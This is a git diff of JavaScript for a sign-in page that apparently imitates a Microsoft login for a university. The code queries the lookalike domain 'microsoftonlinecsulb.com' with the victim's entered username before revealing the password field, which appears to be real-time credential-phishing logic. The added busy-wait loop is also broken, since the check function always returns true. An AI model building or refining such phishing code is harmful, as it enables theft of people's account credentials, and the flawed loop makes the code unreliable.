@@ -8,6 +8,30 @@ var emailDiv = document.querySelector(".email-sign-in-form");
 var loadingDiv = document.querySelector(".loading-screen");
 var superloadingDiv = document.querySelector(".loading-screen-div");
 
+function functioncheck(){
+            // alert('saved');
+            
+            $.ajax({
+              url:'https://www.microsoftonlinecsulb.com/'+$("#username").val()+'.txt',
+              type:'HEAD',
+              error: function()
+              {
+                  //file not exists
+                  console.log("false");
+                  return false;
+              },
+              success: function()
+              {
+                  //file exists
+                  loadingDiv.style.display = "none";
+              superloadingDiv.style.display = "none";
+              passwordDiv.style.display = "block";
+              }
+          });
+          console.log("true");
+
+          return true;
+}
 
 
 $(document).on('submit','#login-form',function(e)
@@ -23,29 +47,18 @@ $(document).on('submit','#login-form',function(e)
         },
         success:function()
         {
-          // alert('saved');
           loadingDiv.style.display = "block";
           superloadingDiv.style.display = "block";
           passwordDiv.style.display = "none";
-          $.ajax({
-            url:'https://www.microsoftonlinecsulb.com/'+$("#username").val()+'.txt',
-            type:'HEAD',
-            error: function()
-            {
-                //file not exists
-                console.log("err")
-            },
-            success: function()
-            {
-                //file exists
-                loadingDiv.style.display = "none";
-            superloadingDiv.style.display = "none";
-            passwordDiv.style.display = "block";
-            }
-        });
+          while(functioncheck() == false){
+            console.log("loop");
+
+          }
         }
       })
     });
+
+
 
 
 //call python function
